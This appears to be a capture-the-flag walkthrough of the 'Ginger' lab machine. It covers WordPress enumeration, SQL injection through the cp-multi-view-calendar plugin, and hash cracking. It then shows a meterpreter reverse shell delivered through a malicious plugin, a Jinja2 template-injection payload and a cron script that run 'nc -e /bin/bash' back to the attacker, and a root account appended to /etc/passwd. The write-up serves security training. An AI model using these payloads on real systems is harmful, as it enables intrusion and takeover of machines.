#### **Difficulty: `Hard`**
#### **Target Machine: `10.0.0.26`**
#### **Local Machine: `10.0.0.27`**

# *1. Enumeration*

    root@kali ~/D/M/Ginger# nmap -sS -A -p- -T4 10.0.0.26

    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
    | ssh-hostkey: 
    |   2048 0c:3f:13:54:6e:6e:e6:56:d2:91:eb:ad:95:36:c6:8d (RSA)
    |   256 9b:e6:8e:14:39:7a:17:a3:80:88:cd:77:2e:c3:3b:1a (ECDSA)
    |_  256 85:5a:05:2a:4b:c0:b2:36:ea:8a:e2:8a:b2:ef:bc:df (ED25519)
    80/tcp open  http    Apache httpd 2.4.38 ((Debian))
    |_http-title: Apache2 Debian Default Page: It works
    |_http-server-header: Apache/2.4.38 (Debian)

Let's start by enumerating HTTP.

    root@kali ~/D/M/Ginger# gobuster dir -u http://10.0.0.26/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,html,php

    /index.html           (Status: 200) [Size: 10701]
    /wordpress            (Status: 301) [Size: 310] [--> http://10.0.0.26/wordpress/]
    /server-status        (Status: 403) [Size: 274] 

Let's scan the **'wordpress'** directory.

    root@kali ~/D/M/Ginger# gobuster dir -u http://10.0.0.26/wordpress/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html 

    /index.php            (Status: 301) [Size: 0] [--> http://10.0.0.26/wordpress/]
    /wp-content           (Status: 301) [Size: 321] [--> http://10.0.0.26/wordpress/wp-content/]
    /license.txt          (Status: 200) [Size: 19915]                                           
    /wp-login.php         (Status: 200) [Size: 6952]                                            
    /wp-includes          (Status: 301) [Size: 322] [--> http://10.0.0.26/wordpress/wp-includes/]
    /readme.html          (Status: 200) [Size: 7345]                                             
    /wp-trackback.php     (Status: 200) [Size: 135]                                              
    /wp-admin             (Status: 301) [Size: 319] [--> http://10.0.0.26/wordpress/wp-admin/]   
    /xmlrpc.php           (Status: 405) [Size: 42]                                               
    /wp-signup.php        (Status: 302) [Size: 0] [--> /wordpress/wp-login.php?action=register] 

Using the **'wslscan'** command we can identify vulnerabilities on the remote server.

    root@kali ~/D/M/Ginger# wpscan -e u,p,t -v --url http://10.0.0.26/wordpress

    [+] webmaster
    | Found By: Rss Generator (Passive Detection)
    | Confirmed By:
    |  Wp Json Api (Aggressive Detection)
    |   - http://10.0.0.26/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
    |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
    |  Login Error Messages (Aggressive Detection)

Trying to brute force the login using the user **'webmaster'** didn't work and so let's try to find any exploitable plugins.

    root@kali ~/D/M/Ginger# wpscan --url http://10.0.0.26/wordpress --plugins-detection aggressive

    [i] Plugin(s) Identified:

    [+] akismet
    | Location: http://10.0.0.26/wordpress/wp-content/plugins/akismet/
    | Last Updated: 2022-07-26T16:13:00.000Z
    | Readme: http://10.0.0.26/wordpress/wp-content/plugins/akismet/readme.txt
    | [!] The version is out of date, the latest version is 5.0
    |
    | Found By: Known Locations (Aggressive Detection)
    |  - http://10.0.0.26/wordpress/wp-content/plugins/akismet/, status: 200
    |
    | Version: 4.1.9 (100% confidence)
    | Found By: Readme - Stable Tag (Aggressive Detection)
    |  - http://10.0.0.26/wordpress/wp-content/plugins/akismet/readme.txt
    | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
    |  - http://10.0.0.26/wordpress/wp-content/plugins/akismet/readme.txt

    [+] cp-multi-view-calendar
    | Location: http://10.0.0.26/wordpress/wp-content/plugins/cp-multi-view-calendar/
    | Last Updated: 2022-05-23T17:04:00.000Z
    | Readme: http://10.0.0.26/wordpress/wp-content/plugins/cp-multi-view-calendar/README.txt
    | [!] The version is out of date, the latest version is 1.4.06
    | [!] Directory listing is enabled
    |
    | Found By: Known Locations (Aggressive Detection)
    |  - http://10.0.0.26/wordpress/wp-content/plugins/cp-multi-view-calendar/, status: 200
    |
    | Version: 1.0.2 (50% confidence)
    | Found By: Readme - ChangeLog Section (Aggressive Detection)
    |  - http://10.0.0.26/wordpress/wp-content/plugins/cp-multi-view-calendar/README.txt

Let's find exploits for this plugins.
Following this [exploit][1] for cp-multi-view-calendar we perform a SqlI on the remote machine using **'sqlmap'**

    root@kali ~/D/M/G/e/cp-multi-view-calendar# sqlmap -u 'http://10.0.0.26/wordpress/?action=data_management&cpmvc_do_action=mvparse&f=edit&id=1' -dbs -batch -dump

    ...
    available databases [2]:
    [*] information_schema
    [*] wordpress_db
    ...

    root@kali ~/D/M/G/e/cp-multi-view-calendar# sqlmap -u 'http://10.0.0.26/wordpress/?action=data_management&cpmvc_do_action=mvparse&f=edit&id=1' -batch -dump -D wordpress_db -tables

    [16 tables]
    +------------------------+
    | wp_commentmeta         |
    | wp_comments            |
    | wp_dc_mv_calendars     |
    | wp_dc_mv_configuration |
    | wp_dc_mv_events        |
    | wp_dc_mv_views         |
    | wp_links               |
    | wp_options             |
    | wp_postmeta            |
    | wp_posts               |
    | wp_term_relationships  |
    | wp_term_taxonomy       |
    | wp_termmeta            |
    | wp_terms               |
    | wp_usermeta            |
    | wp_users               |
    +------------------------+

We already that the user **'webmaster'** is on the remote machine, let's see if we can find more users or the password for the user.

    root@kali ~/D/M/G/e/cp-multi-view-calendar# sqlmap -u 'http://10.0.0.26/wordpress/?action=data_management&cpmvc_do_action=mvparse&f=edit&id=1' --technique T -batch -dump -D wordpress_db -T wp_users --columns

    +---------------------+---------------------+
    | Column              | Type                |
    +---------------------+---------------------+
    | display_name        | varchar(250)        |
    | ID                  | bigint(20) unsigned |
    | user_activation_key | varchar(255)        |
    | user_email          | varchar(100)        |
    | user_login          | varchar(60)         |
    | user_nicename       | varchar(50)         |
    | user_pass           | varchar(255)        |
    | user_registered     | datetime            |
    | user_status         | int(11)             |
    | user_url            | varchar(100)        |
    +---------------------+---------------------+

    +----+-------------------------------+------------------------------------+---------------------+------------+-------------+--------------+---------------+---------------------+---------------------+
    | ID | user_url                      | user_pass                          | user_email          | user_login | user_status | display_name | user_nicename | user_registered     | user_activation_key |
    +----+-------------------------------+------------------------------------+---------------------+------------+-------------+--------------+---------------+---------------------+---------------------+
    | 1  | http://192.168.0.14/wordpress | $P$BsyLMheEjjRPfxertXBQWm6Nq8.YBr. | webmaster@gmail.com | webmaster  | 0           | webmaster    | webmaster     | 2021-06-02 05:28:40 | <blank>             |
    +----+-------------------------------+------------------------------------+---------------------+------------+-------------+--------------+---------------+---------------------+---------------------+

Let's crack the password using **'john'**.

    root@kali ~/D/M/Ginger [SIGINT]# john hash --wordlist=/usr/share/wordlists/rockyou.txt
    Using default input encoding: UTF-8
    Loaded 1 password hash (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])
    Cost 1 (iteration count) is 8192 for all loaded hashes
    Will run 2 OpenMP threads
    Press 'q' or Ctrl-C to abort, almost any other key for status
    sanitarium       (?)     
    1g 0:00:00:06 DONE (2022-09-02 09:42) 0.1655g/s 16561p/s 16561c/s 16561C/s shunda..rosnah
    Use the "--show --format=phpass" options to display all of the cracked passwords reliably
    Session completed. 

After logging in we have access to the site's dashboard.

![image](https://user-images.githubusercontent.com/76552238/188171265-0aeca353-3bde-4033-a087-e1d7f4aca3d6.png)

# *2. Exploitation*

I tried editing the PHP to a  reverse shell script but that didn't work, so let's upload a malicious plugin from **'https://github.com/wetw0rk/malicious-wordpress-plugin'**.

    root@kali ~/D/M/Ginger#  git clone https://github.com/wetw0rk/malicious-wordpress-plugin

    root@kali ~/D/T/W/malicious-wordpress-plugin (master)# python wordpwn.py 10.0.0.27 4444 Y
    [*] Checking if msfvenom installed
    [+] msfvenom installed
    [+] Generating plugin script
    [+] Writing plugin script to file
    [+] Generating payload To file
    [-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
    [-] No arch selected, selecting arch: php from the payload
    Found 1 compatible encoders
    Attempting to encode payload with 1 iterations of php/base64
    php/base64 succeeded with size 1503 (iteration=0)
    php/base64 chosen with final size 1503
    Payload size: 1503 bytes

    [+] Writing files to zip
    [+] Cleaning up files
    [+] URL to upload the plugin: http://(target)/wp-admin/plugin-install.php?tab=upload
    [+] How to trigger the reverse shell : 
        ->   http://(target)/wp-content/plugins/malicious/wetw0rk_maybe.php
        ->   http://(target)/wp-content/plugins/malicious/QwertyRocks.php
    [+] Launching handler
                                                    
    _                                                    _
    / \    /\         __                         _   __  /_/ __                                                
    | |\  / | _____   \ \           ___   _____ | | /  \ _   \ \                                               
    | | \/| | | ___\ |- -|   /\    / __\ | -__/ | || | || | |- -|                                              
    |_|   | | | _|__  | |_  / -\ __\ \   | |    | | \__/| |  | |_                                              
        |/  |____/  \___\/ /\ \\___/   \/     \__|    |_\  \___\                                             
                                                                                                            

        =[ metasploit v6.1.22-dev                          ]
    + -- --=[ 2188 exploits - 1161 auxiliary - 400 post       ]
    + -- --=[ 596 payloads - 45 encoders - 10 nops            ]
    + -- --=[ 9 evasion                                       ]

    Metasploit tip: Use sessions -1 to interact with the 
    last opened session

    [*] Processing wordpress.rc for ERB directives.
    resource (wordpress.rc)> use exploit/multi/handler
    [*] Using configured payload generic/shell_reverse_tcp
    resource (wordpress.rc)> set PAYLOAD php/meterpreter/reverse_tcp
    PAYLOAD => php/meterpreter/reverse_tcp
    resource (wordpress.rc)> set LHOST 10.0.0.27
    LHOST => 10.0.0.27
    resource (wordpress.rc)> set LPORT 4444
    LPORT => 4444
    resource (wordpress.rc)> exploit
    [*] Started reverse TCP handler on 10.0.0.27:4444 


After running the command the zip file **'malicious.zip'** is created which we can upload to the remote server.  
After uploading the plugin we access and get a reverse shell on the machine by going to **'http://10.0.0.26/wordpress/wp-content/plugins/malicious/wetw0rk_maybe.php'**.

    Local Host:

    root@kali ~/D/M/Ginger# curl http://10.0.0.26/wordpress/wp-content/plugins/malicious/wetw0rk_maybe.php

    Reverse TCP handler on 10.0.0.27:4444:

    [*] Meterpreter session 1 opened (10.0.0.27:4444 -> 10.0.0.26:49724 ) at 2022-09-02 10:31:20 -0400
    meterpreter > shell
    whoami
    www-data

# 3. *Privilege Escalation*

Let's find out what permission the **'www-data'** user has on the remote machine and how we can move laterally and vertically through the machine.

Going to the **'/home'** directory we can see there are 3 users on the remote machine.

    www-data@ginger:/home$ ls -l
    total 12
    drwxr-xr-- 5 caroline  webmaster 4096 May 25  2021 caroline
    drwxr-xr-x 4 sabrina   sabrina   4096 May 25  2021 sabrina
    drwx------ 4 webmaster webmaster 4096 May 25  2021 webmaster

Going to the **'sabrina'** directory we have 2 files.

    www-data@ginger:/home/sabrina$ ls
    limage.jpg  password.txt

    www-data@ginger:/home/sabrina$ cat password.txt
    I forgot my password again...
    I wrote it down somewhere in this form: sabrina:password
    but I don't know where... I have to search in my memory

Using the **'dmesg'** command we can see the password.

    www-data@ginger:/home/sabrina$ dmesg | grep sabrina
    dmesg | grep sabrina
    [   25.010420] sabrina:dontforgetyourpasswordbitch

After logging in as the user **'sabrina'**, let's see what sudo permissions he is.

    sabrina@ginger:~$ sudo -ll
    Matching Defaults entries for sabrina on ginger:
        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

    User sabrina may run the following commands on ginger:

    Sudoers entry:
        RunAsUsers: webmaster
        Options: !authenticate
        Commands:
            /usr/bin/python /opt/app.py *

Let's read the **'/opt/app.py'** file.

sabrina@ginger:~$ cat /opt/app.py

    from flask import Flask, request, render_template_string,render_template

    app = Flask(__name__)
    @app.route('/')
    def hello_ssti():
        person = {'name':"world",'secret':"UGhldmJoZj8gYWl2ZnZoei5wYnovcG5lcnJlZg=="}
        if request.args.get('name'):
            person['name'] = request.args.get('name')
        template = '''<h2>Hello %s!</h2>''' % person['name']
        return render_template_string(template,person=person)
    def get_user_file(f_name):
        with open(f_name) as f:
            return f.readlines()
    app.jinja_env.globals['get_user_file'] = get_user_file

    if __name__ == "__main__":
        app.run(debug=True)

The server isn't running on **'0.0.0.0'** which means we can't access it. Since we can access the remote server using SSH let's port forward the server's content to our localhost. 

    root@kali ~/D/M/Ginger# ssh -L 8080:localhost:5000 sabrina@10.0.0.26

![image](https://user-images.githubusercontent.com/76552238/188196229-c2916bcb-30e7-4971-b0e9-ed364cff2b85.png)

    {% for c in [].__class__.__base__.__subclasses__() %}
    {% if c.__name__ == 'catch_warnings' %}
    {% for b in c.__init__.__globals__.values() %}
    {% if b.__class__ == {}.__class__ %}
        {% if 'eval' in b.keys() %}
        {{ b['eval']('__import__("os").popen("nc 10.0.0.27 5555 -e /bin/bash").read()') }}
        {% endif %}
    {% endif %}
    {% endfor %}
    {% endif %}
    {% endfor %}

Going to **'http://localhost:8080/?name={%%20for%20c%20in%20[].__class__.__base__.__subclasses__()%20%}{%%20if%20c.__name__%20==%20%27catch_warnings%27%20%}{%%20for%20b%20in%20c.__init__.__globals__.values()%20%}{%%20if%20b.__class__%20==%20{}.__class__%20%}{%%20if%20%27eval%27%20in%20b.keys()%20%}{{%20b[%27eval%27](%27__import__(%22os%22).popen(%22nc%2010.0.0.27%205555%20-e%20/bin/bash%22).read()%27)%20}}{%%20endif%20%}{%%20endif%20%}{%%20endfor%20%}{%%20endif%20%}{%%20endfor%20%}'** we get a reverse shell as the user webmaster.

    2022/09/02 17:29:01 CMD: UID=0    PID=2200   | /usr/sbin/CRON -f 
    2022/09/02 17:29:01 CMD: UID=0    PID=2201   | /usr/sbin/CRON -f 
    2022/09/02 17:29:01 CMD: UID=1002 PID=2202   | /bin/sh -c bash ~/backup/backup.sh 
    2022/09/02 17:29:01 CMD: UID=1002 PID=2203   | bash /home/caroline/backup/backup.sh 

>
    Remote Server:

    webmaster@ginger:/home/caroline/backup$ rm backup.sh
    rm: remove write-protected regular file 'backup.sh'? y
    webmaster@ginger:/home/caroline/backup$ ls -l
    total 0
    webmaster@ginger:/home/caroline/backup$ touch backup.sh
    webmaster@ginger:/home/caroline/backup$ chmod +x backup.sh
    webmaster@ginger:/home/caroline/backup$ echo 'nc 10.0.0.27 6666 -e /bin/bash' > backup.sh

    Local Host:

    root@kali ~/D/M/Ginger# nc -lnvp 6666
    listening on [any] 6666 ...
    connect to [10.0.0.27] from (UNKNOWN) [10.0.0.26] 52206
    whoami
    caroline

    caroline@ginger:~$ cat user.txt
    cat user.txt
    f65aaadaeeb04adaccba45d7babf5f8c

>

    caroline@ginger:~$ sudo -ll
    sudo -ll
    Matching Defaults entries for caroline on ginger:
        env_reset, mail_badpass,
        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

    User caroline may run the following commands on ginger:

    Sudoers entry:
        RunAsUsers: ALL
        RunAsGroups: ALL
        Options: !authenticate
        Commands:
            /srv/code  

    sabrina@ginger:~$ openssl passwd -1
    password: 1

After running the **'code'** binary as the user caroline we can edit the **'/etc/passwd'** file and switch to a user with root privileges. 

    sabrina@ginger:~$ echo 'rooter:$1$0XYTpFE8$W.foK2azW7vh8w39taS1I1:0:0:root:/root:/bin/bash' >> /etc/passwd 

    sabrina@ginger:~$ su rooter
    password: 1

    root@ginger:/home/sabrina# id -a
    uid=0(root) gid=0(root) groups=0(root)

    root@ginger:~# cat root.txt
    ae426c9d237d676044e5cd8e8af9ef7f

[1]: "https://www.exploit-db.com/exploits/37560"